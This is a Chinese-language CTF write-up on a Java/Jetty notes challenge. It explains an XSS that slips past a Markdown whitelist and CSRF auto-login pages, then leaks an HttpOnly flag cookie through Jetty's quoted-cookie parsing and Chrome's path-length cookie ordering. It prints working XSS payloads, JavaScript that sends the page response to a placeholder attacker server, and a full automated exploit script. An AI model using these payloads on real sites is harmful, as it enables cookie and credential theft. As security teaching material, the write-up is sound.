---
title: NeSE三月升级赛WriteUp (Web)
date: 2023-03-19 20:44:20
categories:
  - CTF
---

又是一个XSS题，Docker里起了一个Web一个Bot一个Redis，Web使用Java写的，用的Eclipse的Jetty服务器，上层是Micronaut微服务框架来的，整体打包成一个JAR。

<!-- more -->

附件地址：[CTF-Chal/fancy-notes.zip (github.com)](https://github.com/huj13k4n9/CTF-Chal/blob/main/NeSE%20Upgrade/fancy-notes.zip)

一开始还以为是Java相关的漏洞，随手看了下反编译，发现好像除了题目是Java写的之外和Java没啥关系，同理Redis也只是个用来传数据的中间媒介，似乎也利用不了什么漏洞。于是继续关注题目本身的逻辑。

先看Bot做了啥：

```js
const puppeteer = require("puppeteer");
const Redis = require('ioredis');
const connection = new Redis(6379, process.env.REDIS_HOST ?? "127.0.0.1");

const browser_option = {
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-gpu',
        '--js-flags="--noexpose_wasm --jitless"',
    ],
    executablePath: "google-chrome-stable"
};

const MAIN_SITE = process.env.MAIN_SITE ?? "http://127.0.0.1:8000"
const FLAG = process.env.FLAG ?? "flag{test}"

const sleep = (delay) => {
    return new Promise((resolve) => setTimeout(resolve, delay))
}

async function browse(url) {

    console.log(`[+] browsing ${url} started`)

    const browser = await puppeteer.launch(browser_option);
    const page = await browser.newPage();

    page.on('dialog', async (dialog) => {
        await dialog.dismiss();
    });

    try {

        await page.goto(MAIN_SITE, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(1000);

        await page.setCookie({
            name: "FLAG",
            value: FLAG,
            domain: new URL(MAIN_SITE).hostname,
            path: "/",
            secure: false,
            httpOnly: true
        });

        await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);
        console.log(await page.cookies(MAIN_SITE));

    } catch (err) {
        console.log(err);
    } finally {
        await page.close();
        await browser.close();
    }

    console.log(`[+] browsing ${url} finished`)
}

const handler = async () => {
    console.log('[+] Starting bot');

    while (true) {
	console.log("[+] Working ")
        connection.blpop('urls', 0, async (err, message) => {
            try {
                let url = message[1];
                let parsed = new URL(url);
                if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
                    throw new Error('Invalid protocol');
                } else {
                    console.log('[+] Visiting ' + url);
                    await browse(url);
                }
                await sleep(3000);
            } catch (e) { }
        });
        await sleep(3000)
    }
}

handler();
```

能看见Bot首先访问了网站的首页，然后把Flag写进了Cookie里面，加了HTTP Only（这个是重点，等会会考），然后就会访问提交给Bot的URL了。Bot是死循环从Redis里面读URL，网站里也有相关的逻辑。

Web里面写了5个Controller，一个`/auth`负责注册登录，一个`/home`是用来展示用户的Notes，还有`/submit`用来给Bot提交URL，`/notes`负责新增Note的逻辑，还有一个`/error`，是用来展示错误页的。

# XSS

首先是在展示Note的`/home`路由下发现可能会有XSS，这个功能是纯前端的实现，代码如下：

```js
const createErrCookie = (error) => {
    document.cookie = `error=${error}; path=/error`;
}
const getNotes = () => {
    return fetch("/notes", {
        credentials: "include",
    }).then(res => {
        return res.json();
    }).catch(e => {
        console.log("error when fetching notes: "+ e)
        createErrCookie("error fetching notes")
    })
}
const createNoteCard = (note) => {
    const card = document.createElement("div");
    card.classList.add("card");
    card.classList.add("mb-3");
    card.classList.add("text-center")
    const cardheader = document.createElement("div");
    cardheader.classList.add("card-header");
    cardheader.innerText = note.title
    const cardbody = document.createElement("div");
    cardbody.classList.add("card-body");
    cardbody.innerHTML = parseMarkdown(note.content)
    card.appendChild(cardheader);
    card.appendChild(cardbody);
    return card;
}

const parseNode = (node) => {
    let nodeName = node.nodeName.toLowerCase();
    if (nodeName == "p") {
        return `<p>${node.innerText}</p>`
    } else if (["h1", "h2", "h3", "h4", "h5"].includes(nodeName)) {
        const tagName = nodeName.toLowerCase()
        return `<${tagName}>${node.innerText}</${tagName}>`;
    } else if (nodeName == "a") {
        let href = decodeURIComponent(node.href);
        if (!parseLinkHref(href) || checkLinkHref(href)) {
            createErrCookie("Invalid link href")
            return `<a target="_blank" href=# >${node.innerText}</a>`
        }
        return `<a target="_blank" href=${href} >${node.innerText}</a>`
    } else if (nodeName == "strong") {
        return `<strong>${node.innerText}</strong>`
    } else if (nodeName == "small") {
        return `<small>${node.innerText}</small>`
    }
}

const checkLinkHref = (hrefUrl) => {
    // let's check if the href contains any forbidden characters
    const forbidden = [" ","\r","\n","<",">","\"","'","script"];
    const forbiddenRegex = new RegExp(forbidden.join("|"), "i");
    if (forbiddenRegex.test(hrefUrl)) {
        return true;
    }
    return false;
}

const parseLinkHref = (hrefUrl) => {
    try {
        let url = new URL(hrefUrl);
        let protocol = url.protocol;
        if (protocol == "http:" || protocol == "https:") {
            return hrefUrl;
        } else {
            return false;
        }
    } catch (e) {
        return false;
    }
}

const parseMarkdown = (md) => {
    let html = marked.parse(md)
    let dom = new DOMParser().parseFromString(html, "text/html")
    let tmpl = dom.body;
    let result = ""

    const allowedTags = ["p", "strong", "small", "a", "h1", "h2", "h3", "h4", "h5"];
    const allTags = tmpl.getElementsByTagName("*");
    for (let i = 0; i < allTags.length; i++) {
        // If the tag is not allowed, remove it from the element
        if (!allowedTags.includes(allTags[i].tagName.toLowerCase())) {
            allTags[i].parentNode.removeChild(allTags[i]);
        } else {
            result += parseNode(allTags[i]);
        }
    }

    return result;
}

document.addEventListener("DOMContentLoaded", async () => {
    const cookies = document.cookie.split(';');
    // check error cookies
    for(let i = 0; i < cookies.length; i++) {
        let cookie = cookies[i];
        while (cookie.charAt(0) === ' ') {
            cookie = cookie.substring(1);
        }
        if (cookie.indexOf('error=') === 0) {
            location.href = "/error/frontend";
        }
    }

    let notes = await getNotes();
    for (let note of notes) {
        const card = createNoteCard(note);
        document.getElementById("card-lists").appendChild(card);
    }
})
```

这里用前端实现了一个解析Markdown的功能，但是限制标签用的是白名单，基本上只能用来显示文本。唯一一处就是`<a>`标签的`href`是直接被读入进去的，但其实也只能控制这一个属性，因为还过滤了空格以及一系列其他的敏感字符串，所以也没法新增其他的属性了，这条路也基本上被堵死了。但是后面发现marked.js解析Markdown的时候会对某些畸形的标签识别错误，比如对于一个不完整的标签，marked.js会直接当成`<p>`处理，因此也就给了绕过过滤的机会。

```html
<a style="transition:outline 1s" tabindex="1" ontransitionend="alert(1)//
```

上面的Payload渲染之后会变成这个样子，可以发现确实是被当成了`<p>`标签，后面不完整的部分就直接被Chrome补全了。直接实现了XSS。

![](https://pic.hujiekang.top/uploads/big/0f68ea6f212fd2d74c388c84597766f3.png)

# 构造页面让Bot访问

接下来构造页面，让Bot来访问触发XSS。因为Web没法登陆后自动跳转到Notes页面，所以构造页面的时候，首先肯定是伪造Form用CSRF登录网站，随后还要想办法自动的带着已登录的身份跳转到`/home`路由下面，从而触发XSS Payload。构造的页面如下：

```html
<!-- index.html -->
<form action="http://web:8000/auth/signin" method="POST">
    <input id="u" name="username" type="name" />
    <input id="p" name="password" type="password" />
</form>

<script>
    document.querySelector("#u").value = "111111";
    document.querySelector("#p").value = "111111";
    document.querySelector("form").submit();
    // 用window.open()开一个新窗口进行跳转
    window.open("./redirect.html");
</script>

<!-- redirect.html -->
<!-- 1s后自动跳转到/home路由下 -->
<meta http-equiv="refresh" content="1; url='http://web:8000/home'">
```

首先Bot访问index.html，这个页面会自动提交用户名和密码实现自动登录，登录之后用`window.open()`打开了一个新窗口，访问redirect.html，里面的`<meta>`标签设置好了延迟1s再跳转，避免出现这里跳转比登录的操作返回得更快，从而没有认证的情况。

此外，因为Note的内容限制了最大长度为100，所以还需要修改XSS Payload来执行更多代码（这里的fa-spin是页面里引入的FontAwesome CSS里面的现成的过渡动画，可以缩短Payload长度）：

```js
<a style="animation-name:fa-spin" onwebkitanimationend=eval(atob(location.hash.substr(1)))//
```

于是后面要执行的JS代码可以直接从hash里面传了。试一试传统的`document.cookie`大法，发现啥也没打回来，这个时候想到Bot那边写的Cookie是HTTPOnly的，所以根本没法从JS读到，这样就需要从其他地方找利用点了。因为是第一次碰到HTTPOnly的绕过，搜索了一下已知的绕过方法除了上古时代的TRACE方法和Cookie Jar Overflow（这个还只能覆盖没法读取）以外基本上都是依靠后端的逻辑漏洞来实现的，比如PHPINFO，从服务端直接泄露Cookie。

# 泄露HTTPOnly Cookie

既然要泄露Cookie，就先找找看后端哪些地方读了Cookie，这个时候错误页的路由逻辑就开始派上用场：

```java
@Controller("/error")
public class ExceptionController {
  private final Logger logger = LoggerFactory.getLogger(ExceptionController.class);

  ......

  @Get("/frontend")
  @Error(global = true)
  @View("error")
  public HttpResponse<?> error(HttpRequest<?> request) {
    DetailedException detailedExceptionMessage;
    try {
      detailedExceptionMessage = createDetailedExceptionMessage(request);
    } catch (Exception e) {
      return (HttpResponse<?>)HttpResponse.status(HttpStatus.INTERNAL_SERVER_ERROR);
    }
    this.logger.error(detailedExceptionMessage.getReferrer() + ": " + detailedExceptionMessage.getReferrer());
    return (HttpResponse<?>)HttpResponse.status(HttpStatus.INTERNAL_SERVER_ERROR)
      .body(CollectionUtils.mapOf(new Object[] { "error", detailedExceptionMessage, "detailed", Boolean.valueOf(true) }));
  }

  private static DetailedException createDetailedExceptionMessage(HttpRequest<?> request) {
    return new DetailedException((String)request.getHeaders().get("User-Agent"), (String)request
        .getHeaders().get("Referer"),
        URLDecoder.decode(request.getCookies().get("error").getValue(), StandardCharsets.UTF_8), new Date());
  }
}
```

能看见`createDetailedExceptionMessage()`方法里面获取了名为`error`的Cookie值，并且将其作为返回的参数传给了前端的模板渲染。那么问题来了，它读它的`error`，跟我要读`FLAG`有啥关系呢……

于是乎开始打断点调试（Docker里面用的是JDWP远程调试），尝试跟踪到服务器对HTTP请求头里Cookie字段的处理逻辑，最终定位到Jetty下面的`org.eclipse.jetty.server.CookieCutter#parseFields`方法，这个方法将Cookie字段的数据逐字符的判断，最终形成Cookie的键值对对象。跟了几遍之后发现一切似乎都很正常，用了好几个Flag来确定当前读到的字符是属于什么部分的，每读到一个分号就生成一个新的Cookie键值对。

但是还是发现了一些不寻常的东西，就是这套判断逻辑中还对Cookie的值有没有加引号进行了判断，如果发现这个值是被引号括住的，那么就会读取引号里面的内容。下面这段代码判断当前字符是否属于Cookie的值这一部分（`=`后面的就判断为Cookie的值），如果开头是引号，那么`inQuoted` Flag就会设为`true`。

![](https://pic.hujiekang.top/uploads/big/2914e2da02adfd7b51f326323b4f7945.png)

接下来看inQuoted为true的处理。可见除非再次碰到了引号（说明引号括起来的部分结束了）或者碰到了`\x00`（字符串结束了）这两种情况，否则就会将后面的字符一直读取为当前Cookie的值。这就给利用提供了机会。

![](https://pic.hujiekang.top/uploads/medium/aeb22808f351b9440b4288d6bed97ae1.png)

所以只要下面这种情况，就可以直接读取到Flag：

![](https://pic.hujiekang.top/uploads/big/b61c5072f5ef240881cf2a0ee04f409c.png)

但是Bot那边显然没法像Burp那样抓包修改Cookie的顺序，按照先来后到的原则，通过XSS添加的Cookie必然是在最后一位的（实际测试也是这样），它后边没有任何其他Cookie，所以和没改效果差不多。在此处苦思冥想整不明白咋回事，于是搜了一下Chrome是怎么处理Cookie的排序的，有个回答直接把Chromium的源码贴了出来：

![](https://pic.hujiekang.top/uploads/big/710bb8486321e3521d1114eadd60d745.png)

这就说的很清楚了，除了先来后到以外，还有个优先级更高的因素，就是Cookie生效的路径的长度。于是乎迎刃而解，因为`FLAG`的生效路径是`/`，那只需要把`error` Cookie的生效路径整长一点，就可以让它排在FLAG前面了。最后整出了Payload，把XSS页面里面的题目服务器的IP地址换成了Docker里面的`http://web:8000`，因为FLAG这个Cookie只在这个域下面生效。

```js
document.cookie=`error="a; path=/error/frontend`;
var req=new XMLHttpRequest();
req.open('GET',"/error/frontend",false);
req.withCredentials=true;
req.send(null);
location.href='<EVIL_SERVER_URL>'+btoa(req.responseText);
```

用服务器接收Bot的请求，就能够拿到Bot那边`/error/frontend`的响应，提取出Flag。

![](https://pic.hujiekang.top/uploads/big/4fbc792683281e41eaf772f4f612d711.png)

最后，闲得没事做整了个脚本一键拿Flag：

```python
import requests
from flask import Flask
import string, random
import threading
import re, os
import base64
import logging

CHAL_URL = "<CHAL_URL_HERE>"
SERV_URL = "<EVIL_SERVER_URL>"
USERPASS = "".join([random.choice(string.ascii_lowercase) for i in range(6)])

log = lambda m: print(f"[*] {m}")
sess = requests.Session()
# Disable Flask console output
app = Flask(__name__)
logger = logging.getLogger('werkzeug')
logger.setLevel(logging.ERROR)

@app.route("/")
def auto_login():
    return f"""<form action="http://web:8000/auth/signin" method="POST">
    <input id="u" name="username" type="name" />
    <input id="p" name="password" type="password" />
</form>

<script>
    document.querySelector("#u").value = "{USERPASS}";
    document.querySelector("#p").value = "{USERPASS}";
    document.querySelector("form").submit();
    window.open("./redirect");
</script>"""

@app.route("/redirect")
def exec_payload():
    payload = base64.b64encode(f"""document.cookie=`error="a; path=/error/frontend`;var req=new XMLHttpRequest();req.open('GET',"/error/frontend",false);req.withCredentials=true;req.send(null);location.href='{SERV_URL}/flag/'+btoa(req.responseText);""".encode("utf-8"))
    return f"""<meta http-equiv="refresh" content="1; url='http://web:8000/home#{payload.decode("utf-8")}'">"""

@app.route("/flag/<content>")
def get_flag(content):
    result = re.search("Error:(.*)</li>", base64.b64decode(content.encode("utf-8")).decode("utf-8")).group(1)
    log(f"Result: {result}")
    return "Done"

def register_and_login():
    resp = sess.post(CHAL_URL + "/auth/signup", data={
        "username": USERPASS,
        "password": USERPASS,
    }, allow_redirects=False)

    if resp.headers['Location'] == '/auth/signin':
        log(f"Successfully registered user {USERPASS}.")
    else:
        exit()

    resp = sess.post(CHAL_URL + "/auth/signin", data={
        "username": USERPASS,
        "password": USERPASS,
    }, allow_redirects=False)

    if resp.headers['Location'] == '/':
        log(f"User {USERPASS} logged in.")
    else:
        exit()

def send_xss_payload():
    resp = sess.post(CHAL_URL + "/notes/add", data={
        "title": USERPASS,
        "content": '<a style="animation-name:fa-spin" onwebkitanimationend=eval(atob(location.hash.substr(1)))//',
    }, allow_redirects=False)

    if resp.headers['Location'] == '/home':
        log(f"XSS payload sent.")
    else:
        exit()

def submit_url_to_bot():
    resp = sess.get(CHAL_URL + "/submit")
    prefix = re.search("sha256\(captcha, 0, 6\) == ([0-9a-f]{6})", resp.text).group(1)
    log(f"Got captcha {prefix}, solving...")
    result = re.search("proof of work: (.*)\n", os.popen(f"./pow-solver {prefix}").read()).group(1)
    log(f"Solved! result: {result}.")
    resp = sess.post(CHAL_URL + "/submit", data={
        "url": SERV_URL,
        "captcha": result
    })
    try:
        if resp.json()["result"].startswith("Success"):
            log(f"URL sent to bot. Waiting for flag...")
    except:
        exit()

def main():
    register_and_login()
    send_xss_payload()
    submit_url_to_bot()

if __name__ == "__main__":
    log("XSS server is running.")
    threading.Thread(target=main).start()
    app.run("0.0.0.0", 7000, debug=False)
```

# Reference

- [cookie_manager.mojom - Chromium Code Search](https://source.chromium.org/chromium/chromium/src/+/main:services/network/public/mojom/cookie_manager.mojom;drc=97f8d3cc1b46e4fe14b28f40ddabf273c2c8d005;l=216-217)
- [Cross-Site Scripting (XSS) Cheat Sheet | Web Security Academy (portswigger.net)](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
